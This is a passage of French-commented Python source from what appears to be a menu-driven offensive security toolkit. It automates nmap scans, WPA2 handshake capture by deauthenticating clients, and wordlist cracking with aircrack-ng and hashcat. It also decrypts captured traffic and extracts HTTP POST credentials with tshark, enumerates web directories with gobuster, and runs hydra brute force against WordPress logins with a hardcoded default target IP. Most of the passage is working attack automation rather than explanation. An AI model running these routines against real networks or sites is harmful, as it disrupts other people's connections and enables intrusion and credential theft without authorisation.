                
                # Nettoyer l'input : extraire le domaine/IP si c'est une URL
                from urllib.parse import urlparse
                if network.startswith(('http://', 'https://')):
                    parsed = urlparse(network)
                    network = parsed.hostname or parsed.netloc.split(':')[0]
                    console.print(f"[dim]→ Extraction du domaine: {network}[/dim]")
                elif ':' in network and not '/' in network:
                    # Format "domain:port" → extraire juste le domaine
                    network = network.split(':')[0]
            else:
                iface_idx = int(iface_choice) - 1
                selected_iface = self.interfaces[iface_idx]
                network = selected_iface['ip']
            
            # Scan du réseau avec le timing choisi
            hosts = NmapScanner.scan_network(network, timing)
            
            if not hosts:
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return
            
            # Affichage des hôtes trouvés avec fabricants
            console.print("\n[orange1]Hôtes trouvés:[/orange1]")
            
            host_table = Table(box=box.ROUNDED, style="white")
            host_table.add_column("#", style="orange1", width=4)
            host_table.add_column("IP", style="white", width=15)
            host_table.add_column("MAC", style="dim white", width=17)
            host_table.add_column("Fabricant", style="green", overflow="fold")
            
            for idx, host in enumerate(hosts, 1):
                host_table.add_row(
                    str(idx),
                    host['ip'],
                    host['mac'] or "N/A",
                    host['manufacturer'] or "Inconnu"
                )
            
            console.print(host_table)
            
            # NOUVELLE BOUCLE : Scanner plusieurs hôtes successivement
            while True:
                # NOUVELLE OPTION : Scanner tous les hôtes
                console.print("\n[orange1]Options de scan détaillé:[/orange1]")
                console.print("  [bright_cyan]0[/bright_cyan]. Scanner TOUS les hôtes un par un")
                console.print("  [bright_cyan]#[/bright_cyan]. Scanner un hôte spécifique")
                console.print("  q. Retour au menu principal")
                
                scan_choice = Prompt.ask("\n[orange1]Votre choix[/orange1]", default="q")
                
                if scan_choice.lower() == 'q':
                    break
                
                # OPTION 0 : Scanner tous les hôtes
                if scan_choice == "0":
                    console.print("\n[warning]🔥 Scan de TOUS les hôtes activé![/warning]")
                    
                    # Options de scan
                    scan_type = Prompt.ask(
                        "\nType de scan",
                        choices=["top", "large"],
                        default="top"
                    )
                    
                    scan_timing = Prompt.ask(
                        "Timing",
                        choices=["T1", "T2", "T3", "T4", "T5"],
                        default="T3"
                    )
                    
                    # Scanner chaque hôte
                    for idx, host in enumerate(hosts, 1):
                        console.print(f"\n[orange1]{'═'*60}[/orange1]")
                        console.print(f"[orange1]Scan {idx}/{len(hosts)}[/orange1]")
                        
                        result = NmapScanner.scan_host(host['ip'], scan_type, scan_timing)
                        self.scan_results.append(result)
                        
                        if idx < len(hosts):
                            console.print(f"\n[info]Passage à l'hôte suivant dans 3 secondes...[/info]")
                            import time
                            time.sleep(3)
                    
                    console.print(f"\n[success]✓ Scan de tous les hôtes terminé![/success]")
                    Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                    continue
                
                # Scanner un hôte spécifique
                try:
                    ip_idx = int(scan_choice) - 1
                    if ip_idx < 0 or ip_idx >= len(hosts):
                        console.print("[error]Numéro invalide[/error]")
                        continue
                    
                    selected_host = hosts[ip_idx]
                    selected_ip = selected_host['ip']
                    
                    # Afficher les infos du host sélectionné
                    console.print(f"\n[info]Cible sélectionnée:[/info]")
                    console.print(f"  IP: {selected_ip}")
                    if selected_host['mac']:
                        console.print(f"  MAC: {selected_host['mac']}")
                    if selected_host['manufacturer']:
                        console.print(f"  Fabricant: {selected_host['manufacturer']}")
                    
                    # Options de scan
                    scan_type = Prompt.ask(
                        "\nType de scan",
                        choices=["top", "large"],
                        default="top"
                    )
                    
                    scan_timing = Prompt.ask(
                        "Timing",
                        choices=["T1", "T2", "T3", "T4", "T5"],
                        default="T3"
                    )
                    
                    result = NmapScanner.scan_host(selected_ip, scan_type, scan_timing)
                    self.scan_results.append(result)
                    
                    Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                
                except (ValueError, IndexError) as e:
                    console.print(f"[error]Choix invalide: {e}[/error]")
                    continue
        
        except (ValueError, IndexError) as e:
            console.print(f"[error]Choix invalide: {e}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def _handshake_menu(self):
        """Capture handshake WPA2, crack avec wordlist, déchiffrer pcap"""
        console.print("\n[title]═══ CAPTURE HANDSHAKE WPA2 ═══[/title]")
        console.print("[info]📶 Capture → Crack → Déchiffrement PCAP[/info]\n")

        # ── Vérifier les dépendances ──────────────────────────────────────────
        tools = {
            'airmon-ng':   'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng',
            'aircrack-ng': 'aircrack-ng',
        }
        missing_pkgs = set()
        for tool, pkg in tools.items():
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing_pkgs.add(pkg)
        if missing_pkgs:
            console.print(f"[error]Outils manquants: {', '.join(missing_pkgs)}[/error]")
            console.print(f"[dim]sudo apt install {' '.join(missing_pkgs)}[/dim]")
            Prompt.ask("\n[warning]Entrée pour continuer[/warning]")
            return

        # ── Sélection interface WiFi ──────────────────────────────────────────
        wifi_ifaces = self.dns_monitor.get_wifi_interfaces()
        if not wifi_ifaces:
            console.print("[error]Aucune interface WiFi[/error]")
            Prompt.ask("\n[warning]Entrée pour continuer[/warning]")
            return

        console.print("[orange1]Interfaces WiFi:[/orange1]")
        for idx, iface in enumerate(wifi_ifaces, 1):
            console.print(f"  {idx}. {iface}")
        try:
            iface = wifi_ifaces[int(Prompt.ask("Interface", default="1")) - 1]
        except (ValueError, IndexError):
            iface = wifi_ifaces[0]

        # ── Menu principal ────────────────────────────────────────────────────
        console.print("\n[orange1]Action:[/orange1]")
        console.print("  1. [white]Capturer un handshake (scan + deauth + capture)[/white]")
        console.print("  2. [white]Cracker un fichier .cap / .hccapx existant[/white]")
        console.print("  3. [white]Convertir .cap → .hccapx (pour hashcat)[/white]")
        console.print("  4. [white]Déchiffrer un .pcap avec la clé trouvée[/white]")
        action = Prompt.ask("Action", default="1")

        if action == "1":
            self._hs_capture(iface)
        elif action == "2":
            self._hs_crack()
        elif action == "3":
            self._hs_convert()
        elif action == "4":
            self._hs_decrypt()

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    # ─────────────────────────────────────────────────────────────────────────
    def _hs_capture(self, iface: str):
        """Scan APs → sélection cible → deauth → capture handshake"""
        import tempfile, os, threading

        console.print(f"\n[orange1]═══ CAPTURE HANDSHAKE ═══[/orange1]")

        # 1. Passer en mode monitor
        console.print(f"[info]▶ Passage en mode monitor sur {iface}...[/info]")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
        r = subprocess.run(['sudo', 'airmon-ng', 'start', iface],
                           capture_output=True, text=True)
        # Détecter le nom de l'interface monitor (iface + 'mon' ou indiqué dans la sortie)
        mon_iface = iface + 'mon'
        for line in r.stdout.split('\n'):
            if 'monitor mode' in line.lower() or 'mon' in line.lower():
                import re as _re
                m = _re.search(r'(\w+mon\d*|mon\d+|\w+mon)', line)
                if m:
                    mon_iface = m.group(1)
                    break
        # Vérifier que l'interface monitor existe
        check = subprocess.run(['ip', 'link', 'show', mon_iface], capture_output=True)
        if check.returncode != 0:
            mon_iface = iface + 'mon'
        console.print(f"[success]✓ Interface monitor: [bold]{mon_iface}[/bold][/success]")

        tmpdir = tempfile.mkdtemp(prefix='handshake_')

        try:
            # 2. Scan rapide pour trouver les APs
            console.print("\n[info]🔍 Scan des réseaux WiFi (10s)...[/info]")
            scan_prefix = f"{tmpdir}/scan"
            p_scan = subprocess.Popen(
                ['sudo', 'airodump-ng', '--output-format', 'csv',
                 '-w', scan_prefix, mon_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            cleanup_manager.register_process(p_scan)
            time.sleep(10)
            p_scan.terminate()
            time.sleep(0.5)

            # Parser le CSV airodump
            scan_csv = scan_prefix + '-01.csv'
            aps = []
            try:
                with open(scan_csv, 'r', errors='ignore') as f:
                    lines = f.readlines()
                in_ap = True
                for line in lines:
                    if 'Station MAC' in line:
                        in_ap = False
                        continue
                    if not in_ap or not line.strip() or 'BSSID' in line:
                        continue
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14 and len(parts[0]) == 17:
                        bssid   = parts[0]
                        channel = parts[3].strip()
                        enc     = parts[5].strip()
                        essid   = parts[13].strip()
                        if bssid and essid:
                            aps.append({'bssid': bssid, 'channel': channel,
                                       'enc': enc, 'essid': essid})
            except Exception as e:
                console.print(f"[warning]Erreur parsing CSV: {e}[/warning]")

            if not aps:
                console.print("[error]Aucun AP trouvé — essayez avec un scan plus long[/error]")
                return

            # Afficher les APs
            ap_table = Table(box=box.ROUNDED, style="white", header_style="bold orange1")
            ap_table.add_column("#",      style="orange1", width=4)
            ap_table.add_column("BSSID",  style="white",   width=19)
            ap_table.add_column("CH",     style="cyan",    width=4)
            ap_table.add_column("Chiffrement", style="yellow", width=12)
            ap_table.add_column("SSID",   style="bold green")
            for idx, ap in enumerate(aps, 1):
                ap_table.add_row(str(idx), ap['bssid'], ap['channel'],
                                 ap['enc'], ap['essid'])
            console.print(ap_table)

            # Filtrer WPA uniquement
            wpa_aps = [a for a in aps if 'WPA' in a['enc'].upper()]
            if not wpa_aps:
                console.print("[warning]⚠ Aucun AP WPA/WPA2 trouvé[/warning]")
                return

            try:
                ap_choice = int(Prompt.ask("Numéro de la cible", default="1")) - 1
                target = aps[ap_choice]
            except (ValueError, IndexError):
                target = aps[0]

            console.print(f"\n[success]🎯 Cible: [bold]{target['essid']}[/bold]"
                         f" ({target['bssid']}) canal {target['channel']}[/success]")

            # 3. Lancer capture ciblée
            cap_prefix = f"{tmpdir}/capture_{target['essid'].replace(' ','_')}"
            console.print(f"[info]▶ Capture sur canal {target['channel']}...[/info]")
            p_cap = subprocess.Popen(
                ['sudo', 'airodump-ng',
                 '-c', target['channel'],
                 '--bssid', target['bssid'],
                 '-w', cap_prefix,
                 '--output-format', 'pcap',
                 mon_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            cleanup_manager.register_process(p_cap)
            time.sleep(3)

            # 4. Deauth pour forcer handshake
            nb_deauth = Prompt.ask("[orange1]Paquets deauth à envoyer[/orange1]", default="10")
            console.print(f"[warning]💀 Deauth × {nb_deauth} → {target['bssid']}...[/warning]")
            subprocess.run(
                ['sudo', 'aireplay-ng', '--deauth', nb_deauth,
                 '-a', target['bssid'], mon_iface],
                capture_output=True, timeout=30
            )

            # 5. Attendre le handshake
            console.print("[info]⏳ Attente handshake (20s)... Ctrl+C pour arrêter[/info]")
            try:
                time.sleep(20)
            except KeyboardInterrupt:
                pass
            p_cap.terminate()
            time.sleep(0.5)

            # 6. Vérifier si handshake capturé
            cap_file = cap_prefix + '-01.cap'
            if not os.path.exists(cap_file):
                console.print("[error]Fichier .cap introuvable[/error]")
                return

            check_r = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True, text=True
            )
            if 'handshake' in check_r.stdout.lower():
                console.print(f"[bold green]✓ HANDSHAKE CAPTURÉ ✓[/bold green]")
                console.print(f"[success]Fichier: [bold]{cap_file}[/bold][/success]")
                # Copier dans le répertoire courant
                import shutil
                dest = f"handshake_{target['essid'].replace(' ','_')}.cap"
                shutil.copy2(cap_file, dest)
                console.print(f"[success]✓ Copié → [bold]{dest}[/bold][/success]")
                console.print("\n[orange1]Lancer le crack maintenant ?[/orange1]")
                if Confirm.ask("Crack avec wordlist", default=True):
                    self._hs_crack(cap_file=dest, essid=target['essid'])
            else:
                console.print("[warning]⚠ Pas de handshake dans le .cap[/warning]")
                console.print(f"[dim]Le fichier {cap_file} est conservé[/dim]")
                console.print("[dim]Relancez avec plus de paquets deauth ou attendez"
                             " qu'un client se (re)connecte[/dim]")

        finally:
            # Restaurer mode managed
            subprocess.run(['sudo', 'airmon-ng', 'stop', mon_iface], capture_output=True)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                          capture_output=True)
            console.print(f"[success]✓ {mon_iface} → mode managed[/success]")
            import shutil
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    def _hs_crack(self, cap_file: str = None, essid: str = None):
        """Crack WPA handshake — aircrack-ng puis hashcat"""
        import os

        console.print("\n[orange1]═══ CRACK HANDSHAKE ═══[/orange1]")

        if not cap_file:
            cap_file = Prompt.ask("[orange1]Fichier .cap / .hccapx[/orange1]")
        if not os.path.exists(cap_file):
            console.print(f"[error]Fichier introuvable: {cap_file}[/error]")
            return

        # Wordlist
        default_wl = '/usr/share/wordlists/rockyou.txt'
        if not os.path.exists(default_wl):
            # Chercher alternatives
            for candidate in ['/usr/share/wordlists/fasttrack.txt',
                              '/usr/share/wordlists/dirb/common.txt']:
                if os.path.exists(candidate):
                    default_wl = candidate
                    break
            else:
                default_wl = ''
        wordlist = Prompt.ask("[orange1]Wordlist[/orange1]", default=default_wl)
        if not os.path.exists(wordlist):
            console.print(f"[error]Wordlist introuvable: {wordlist}[/error]")
            console.print("[dim]Télécharger: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz[/dim]")
            return

        # ── Méthode ──────────────────────────────────────────────────────────
        console.print("\n[orange1]Méthode:[/orange1]")
        console.print("  1. [white]aircrack-ng (CPU, direct sur .cap)[/white]")
        has_hashcat = subprocess.run(['which','hashcat'],capture_output=True).returncode == 0
        has_hcxtool = subprocess.run(['which','hcxtools'],capture_output=True).returncode == 0 or                       subprocess.run(['which','hcxpcapngtool'],capture_output=True).returncode == 0
        if has_hashcat:
            console.print("  2. [white]hashcat (GPU, beaucoup plus rapide)[/white]")
        method = Prompt.ask("Méthode", default="1")

        found_key = None

        if method == "2" and has_hashcat:
            # Convertir .cap → .hccapx si besoin
            hccapx = cap_file.replace('.cap', '.hccapx')
            if not cap_file.endswith('.hccapx'):
                console.print("[info]▶ Conversion .cap → .hccapx...[/info]")
                r = subprocess.run(
                    ['aircrack-ng', cap_file, '-j', hccapx.replace('.hccapx','')],
                    capture_output=True, text=True
                )
                if not os.path.exists(hccapx):
                    console.print("[warning]Conversion échouée, tentative avec hcxpcapngtool...[/warning]")
                    subprocess.run(['hcxpcapngtool', '-o', hccapx.replace('.hccapx','.22000'),
                                   cap_file], capture_output=True)
                    hccapx = hccapx.replace('.hccapx', '.22000')

            console.print(f"[info]▶ hashcat sur {hccapx}...[/info]")
            console.print("[warning]Ctrl+C pour arrêter[/warning]\n")
            # Mode 2500 = WPA/WPA2, 22000 = nouveau format
            mode = '22000' if hccapx.endswith('.22000') else '2500'
            try:
                r = subprocess.run(
                    ['hashcat', '-m', mode, hccapx, wordlist,
                     '--force', '--status', '--status-timer=10'],
                    text=True, timeout=3600
                )
                # Récupérer le résultat
                show_r = subprocess.run(
                    ['hashcat', '-m', mode, hccapx, '--show'],
                    capture_output=True, text=True
                )
                if show_r.stdout.strip():
                    found_key = show_r.stdout.strip().split(':')[-1]
            except KeyboardInterrupt:
                console.print("\n[warning]Arrêté[/warning]")
            except subprocess.TimeoutExpired:
                console.print("[warning]Timeout 1h[/warning]")

        else:
            # aircrack-ng
            essid_args = ['-e', essid] if essid else []
            console.print(f"[info]▶ aircrack-ng sur {cap_file}...[/info]")
            console.print("[warning]Ctrl+C pour arrêter[/warning]\n")
            try:
                r = subprocess.run(
                    ['aircrack-ng', cap_file, '-w', wordlist] + essid_args,
                    text=True, timeout=3600
                )
                # Parser le résultat
                for line in r.stdout.split('\n'):
                    if 'KEY FOUND' in line.upper():
                        import re as _re
                        m = _re.search(r'KEY FOUND.*?\[(.+?)\]', line)
                        if m:
                            found_key = m.group(1).strip()
            except KeyboardInterrupt:
                console.print("\n[warning]Arrêté[/warning]")
            except subprocess.TimeoutExpired:
                console.print("[warning]Timeout 1h[/warning]")

        if found_key:
            console.print(f"\n[bold green]🔑 CLÉ TROUVÉE: [bold white]{found_key}[/bold white][/bold green]")
            # Sauvegarder
            key_file = cap_file.replace('.cap','').replace('.hccapx','').replace('.22000','') + '_KEY.txt'
            with open(key_file, 'w') as kf:
                kf.write(f"SSID: {essid or 'inconnu'}\nCLÉ: {found_key}\n")
            console.print(f"[success]✓ Sauvegardé → {key_file}[/success]")

            # Proposer déchiffrement
            if Confirm.ask("\n[orange1]Déchiffrer un .pcap avec cette clé ?[/orange1]", default=False):
                self._hs_decrypt(key=found_key)
        else:
            console.print("[warning]❌ Clé non trouvée dans cette wordlist[/warning]")
            console.print("[dim]Essayez une wordlist plus grande ou des règles hashcat (-r best64.rule)[/dim]")

    # ─────────────────────────────────────────────────────────────────────────
    def _hs_convert(self):
        """Convertit .cap → .hccapx pour hashcat"""
        import os
        cap_file = Prompt.ask("[orange1]Fichier .cap source[/orange1]")
        if not os.path.exists(cap_file):
            console.print("[error]Fichier introuvable[/error]")
            return
        base = cap_file.replace('.cap','')

        console.print("\n[orange1]Format cible:[/orange1]")
        console.print("  1. .hccapx  (hashcat mode 2500 — ancien)")
        console.print("  2. .22000   (hashcat mode 22000 — recommandé)")
        fmt = Prompt.ask("Format", default="2")

        if fmt == "2":
            out = base + '.22000'
            r = subprocess.run(['hcxpcapngtool', '-o', out, cap_file],
                               capture_output=True, text=True)
            if not os.path.exists(out):
                console.print("[error]hcxpcapngtool introuvable[/error]")
                console.print("[dim]sudo apt install hcxtools[/dim]")
                return
        else:
            out = base + '.hccapx'
            r = subprocess.run(['aircrack-ng', cap_file, '-j', base],
                               capture_output=True, text=True)

        if os.path.exists(out):
            console.print(f"[success]✓ Converti → [bold]{out}[/bold][/success]")
        else:
            console.print(f"[error]Échec de conversion[/error]")
            console.print(r.stderr[:300] if r.stderr else "")

    # ─────────────────────────────────────────────────────────────────────────
    def _hs_decrypt(self, key: str = None):
        """Déchiffre un .pcap WPA avec airdecap-ng"""
        import os
        console.print("\n[orange1]═══ DÉCHIFFREMENT PCAP ═══[/orange1]")

        pcap_file = Prompt.ask("[orange1]Fichier .cap / .pcap à déchiffrer[/orange1]")
        if not os.path.exists(pcap_file):
            console.print(f"[error]Fichier introuvable: {pcap_file}[/error]")
            return

        if not key:
            key = Prompt.ask("[orange1]Clé WPA (mot de passe)[/orange1]")
        essid = Prompt.ask("[orange1]SSID du réseau[/orange1]")

        # airdecap-ng -e SSID -p PASSWORD fichier.cap
        console.print(f"[info]▶ Déchiffrement avec airdecap-ng...[/info]")
        r = subprocess.run(
            ['airdecap-ng', '-e', essid, '-p', key, pcap_file],
            capture_output=True, text=True
        )
        console.print(r.stdout)

        # airdecap crée fichier-dec.cap
        dec_file = pcap_file.replace('.cap','-dec.cap').replace('.pcap','-dec.pcap')
        if os.path.exists(dec_file):
            console.print(f"[bold green]✓ Déchiffré → [bold]{dec_file}[/bold][/bold green]")

            # Stats rapides
            stat_r = subprocess.run(
                ['capinfos', dec_file], capture_output=True, text=True
            )
            if stat_r.returncode == 0:
                console.print("\n[dim]" + stat_r.stdout[:500] + "[/dim]")

            # Proposer analyse avec tshark
            has_tshark = subprocess.run(['which','tshark'],capture_output=True).returncode == 0
            if has_tshark and Confirm.ask("\n[orange1]Analyser avec tshark (HTTP + DNS) ?[/orange1]", default=True):
                console.print("\n[orange1]── DNS queries ──[/orange1]")
                subprocess.run(
                    ['tshark', '-r', dec_file, '-Y', 'dns.qry.type == 1',
                     '-T', 'fields', '-e', 'frame.time_relative',
                     '-e', 'ip.src', '-e', 'dns.qry.name'],
                    text=True
                )
                console.print("\n[orange1]── Requêtes HTTP ──[/orange1]")
                subprocess.run(
                    ['tshark', '-r', dec_file, '-Y', 'http.request',
                     '-T', 'fields', '-e', 'frame.time_relative',
                     '-e', 'ip.src', '-e', 'http.host', '-e', 'http.request.uri'],
                    text=True
                )
                console.print("\n[orange1]── Credentials HTTP (POST) ──[/orange1]")
                subprocess.run(
                    ['tshark', '-r', dec_file,
                     '-Y', 'http.request.method == "POST"',
                     '-T', 'fields', '-e', 'ip.src',
                     '-e', 'http.host', '-e', 'http.file_data'],
                    text=True
                )
        else:
            console.print("[error]Déchiffrement échoué — vérifiez la clé et le SSID[/error]")
            if r.stderr:
                console.print(f"[dim]{r.stderr[:300]}[/dim]")

    def _gobuster_menu(self):
        """Scan d'arborescence web avec Gobuster"""
        console.print("\n[title]═══ GOBUSTER — SCAN WEB ═══[/title]")
        console.print("[info]📁 Énumération de répertoires/fichiers sur un serveur web[/info]\n")

        # Vérifier gobuster
        if subprocess.run(['which', 'gobuster'], capture_output=True).returncode != 0:
            console.print("[error]Gobuster n'est pas installé[/error]")
            console.print("[dim]sudo apt install gobuster[/dim]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # URL cible
        target = Prompt.ask("\n[orange1]URL cible[/orange1]\n"
                            "[dim](ex: http://example.com, example.com/admin, 192.168.1.1/repo)[/dim]")
        
        # Ajouter http:// si pas de protocole
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Normaliser : s'assurer que le chemin se termine par / sauf si c'est juste le domaine
        from urllib.parse import urlparse
        parsed = urlparse(target)
        if parsed.path and not parsed.path.endswith('/'):
            target = target + '/'

        # Wordlist — chercher dans le répertoire courant
        import os, glob
        current_dir = os.getcwd()
        wordlists_found = glob.glob(os.path.join(current_dir, '*.txt'))
        
        console.print(f"\n[orange1]Wordlists disponibles dans {current_dir}:[/orange1]")
        if wordlists_found:
            for idx, wl in enumerate(wordlists_found, 1):
                console.print(f"  {idx}. {os.path.basename(wl)}")
            console.print("  0. Chemin personnalisé")
            wl_choice = Prompt.ask("Wordlist", default="1")
            try:
                if wl_choice == "0":
                    wordlist = Prompt.ask("[orange1]Chemin de la wordlist[/orange1]")
                else:
                    wordlist = wordlists_found[int(wl_choice) - 1]
            except (ValueError, IndexError):
                wordlist = wordlists_found[0] if wordlists_found else None
        else:
            console.print("  [dim]Aucune wordlist .txt trouvée[/dim]")
            wordlist = Prompt.ask("[orange1]Chemin de la wordlist[/orange1]",
                                  default="/usr/share/wordlists/dirb/common.txt")

        if not wordlist or not os.path.exists(wordlist):
            console.print(f"[error]Wordlist introuvable: {wordlist}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # Mode
        console.print("\n[orange1]Mode de scan:[/orange1]")
        console.print("  1. dir  — Répertoires")
        console.print("  2. dns  — Sous-domaines")
        console.print("  3. vhost — Virtual hosts")
        mode_choice = Prompt.ask("Mode", choices=["1", "2", "3"], default="1")
        mode_map = {"1": "dir", "2": "dns", "3": "vhost"}
        mode = mode_map[mode_choice]

        # Extensions (pour mode dir)
        extensions = ""
        if mode == "dir":
            ext_input = Prompt.ask("[orange1]Extensions[/orange1] (ex: php,html,txt)",
                                   default="")
            if ext_input:
                extensions = f"-x {ext_input}"

        # Threads
        threads = Prompt.ask("[orange1]Threads[/orange1]", default="50")

        # Construire la commande
        cmd = ['gobuster', mode, '-u', target, '-w', wordlist, '-t', threads]
        if extensions:
            cmd.extend(extensions.split())
        
        # Options supplémentaires
        console.print("\n[orange1]Options:[/orange1]")
        if Prompt.ask("Suivre les redirections (301/302) ? [y/n]", default="n").lower() == 'y':
            cmd.append('-r')
        if Prompt.ask("Afficher les erreurs ? [y/n]", default="n").lower() == 'y':
            cmd.append('-e')
        
        # Note: gobuster v3.8+ a une blacklist par défaut (404)
        # On pourrait utiliser -s pour spécifier des codes, mais ça conflit avec la blacklist
        # Solution : laisser le comportement par défaut (affiche tout sauf 404)
        # Si l'utilisateur veut filtrer, il peut le faire après coup

        # Exécution
        console.print(f"\n[info]🚀 Commande: {' '.join(cmd)}[/info]")
        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")

        try:
            result = subprocess.run(cmd, text=True)
            if result.returncode == 0:
                console.print("\n[success]✓ Scan terminé[/success]")
            else:
                console.print(f"\n[warning]⚠ Scan terminé avec code {result.returncode}[/warning]")
        except KeyboardInterrupt:
            console.print("\n[warning]⚠ Scan interrompu[/warning]")
        except Exception as e:
            console.print(f"\n[error]Erreur: {e}[/error]")

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _hydra_menu(self):
        """Bruteforce HTTP login avec Hydra (2 étapes : users puis passwords)"""
        console.print("\n[title]═══ HYDRA — BRUTEFORCE LOGIN ═══[/title]")
        console.print("[info]🔐 Bruteforce HTTP POST form (WordPress, etc.)[/info]\n")

        # Vérifier hydra
        if subprocess.run(['which', 'hydra'], capture_output=True).returncode != 0:
            console.print("[error]Hydra n'est pas installé[/error]")
            console.print("[dim]sudo apt install hydra[/dim]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # ── ÉTAPE 1 : ÉNUMÉRATION DES USERS ───────────────────────────────────
        console.print("[orange1]═══ ÉTAPE 1 : ÉNUMÉRATION USERS ═══[/orange1]\n")

        # Target
        target = Prompt.ask("[orange1]Cible (IP ou domaine)[/orange1]",
                           default="163.172.228.173")

        # Wordlist users
        import os, glob
        current_dir = os.getcwd()
        wordlists = glob.glob(os.path.join(current_dir, '*.txt'))
        wordlists += glob.glob(os.path.join(current_dir, '*.dic'))

        console.print(f"\n[orange1]Wordlist USERS dans {current_dir}:[/orange1]")
        if wordlists:
            for idx, wl in enumerate(wordlists, 1):
                console.print(f"  {idx}. {os.path.basename(wl)}")
            console.print("  0. Chemin personnalisé")
            wl_choice = Prompt.ask("Wordlist users", default="1")
            try:
                if wl_choice == "0":
                    user_wordlist = Prompt.ask("[orange1]Chemin wordlist users[/orange1]")
                else:
                    user_wordlist = wordlists[int(wl_choice) - 1]
            except (ValueError, IndexError):
                user_wordlist = wordlists[0] if wordlists else None
        else:
            user_wordlist = Prompt.ask("[orange1]Chemin wordlist users[/orange1]")

        if not user_wordlist or not os.path.exists(user_wordlist):
            console.print(f"[error]Wordlist introuvable: {user_wordlist}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # Form parameters
        console.print("\n[orange1]Paramètres du formulaire:[/orange1]")
        form_path = Prompt.ask("[orange1]Chemin formulaire[/orange1]",
                               default="/wp-login.php")
        form_data = Prompt.ask("[orange1]Données POST[/orange1]",
                               default="log=^USER^&pwd=^PASS^&wp-submit=Log+In")
        fail_string = Prompt.ask("[orange1]Chaîne d'échec (dans la réponse)[/orange1]",
                                 default="Invalid username")

        # Mot de passe dummy pour l'énumération users
        dummy_pass = Prompt.ask("[orange1]Mot de passe dummy[/orange1]",
                               default="something")

        # Construction commande étape 1
        cmd1 = [
            'hydra',
            '-L', user_wordlist,
            '-p', dummy_pass,
            target,
            'http-post-form',
            f'{form_path}:{form_data}:F={fail_string}',
            '-vv'
        ]

        console.print(f"\n[info]🚀 Commande: {' '.join(cmd1)}[/info]")
        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")

        # Exécution étape 1
        valid_users = []
        try:
            result = subprocess.run(cmd1, capture_output=True, text=True)
            # Parser la sortie pour extraire les users valides
            for line in result.stdout.split('\n'):
                # Hydra format: [80][http-post-form] host: 163.172.228.173   login: elliot   password: something
                if '[http-post-form]' in line and 'login:' in line:
                    parts = line.split('login:')
                    if len(parts) > 1:
                        user = parts[1].split()[0].strip()
                        if user not in valid_users:
                            valid_users.append(user)
            
            # Aussi chercher dans stderr
            for line in result.stderr.split('\n'):
                if '[http-post-form]' in line and 'login:' in line:
                    parts = line.split('login:')
                    if len(parts) > 1:
                        user = parts[1].split()[0].strip()
                        if user not in valid_users:
                            valid_users.append(user)

            if not valid_users:
                console.print("\n[warning]⚠ Aucun user valide trouvé[/warning]")
                console.print("[dim]La sortie brute:[/dim]")
                console.print(result.stdout[:500])
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return

            console.print(f"\n[success]✓ {len(valid_users)} user(s) valide(s) trouvé(s)[/success]")

        except KeyboardInterrupt:
            console.print("\n[warning]⚠ Scan interrompu[/warning]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return
        except Exception as e:
            console.print(f"\n[error]Erreur: {e}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # ── ÉTAPE 2 : BRUTEFORCE PASSWORDS ────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 2 : BRUTEFORCE PASSWORDS ═══[/orange1]\n")

        # Afficher les users trouvés
        console.print("[orange1]Users valides:[/orange1]")
        for idx, user in enumerate(valid_users, 1):
            console.print(f"  {idx}. [white]{user}[/white]")
        console.print("  0. Tous les users")

        # Sélection user
        try:
            user_idx = int(Prompt.ask("[orange1]User cible[/orange1]", default="1"))
            if user_idx == 0:
                target_users = valid_users
            else:
                target_users = [valid_users[user_idx - 1]]
        except (ValueError, IndexError):
            target_users = [valid_users[0]]

        # Wordlist passwords
        console.print(f"\n[orange1]Wordlist PASSWORDS dans {current_dir}:[/orange1]")
        if wordlists:
            for idx, wl in enumerate(wordlists, 1):
                console.print(f"  {idx}. {os.path.basename(wl)}")
            console.print("  0. Chemin personnalisé")
            wl_choice = Prompt.ask("Wordlist passwords", default="1")
            try:
                if wl_choice == "0":
                    pass_wordlist = Prompt.ask("[orange1]Chemin wordlist passwords[/orange1]")
                else:
                    pass_wordlist = wordlists[int(wl_choice) - 1]
            except (ValueError, IndexError):
                pass_wordlist = wordlists[0] if wordlists else None
        else:
            pass_wordlist = Prompt.ask("[orange1]Chemin wordlist passwords[/orange1]")

        if not pass_wordlist or not os.path.exists(pass_wordlist):
            console.print(f"[error]Wordlist introuvable: {pass_wordlist}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # Nouvelle chaîne d'échec pour les passwords
        fail_string2 = Prompt.ask("[orange1]Chaîne d'échec password (dans la réponse)[/orange1]",
                                  default="is incorrect")

        # Construction commande étape 2
        for user in target_users:
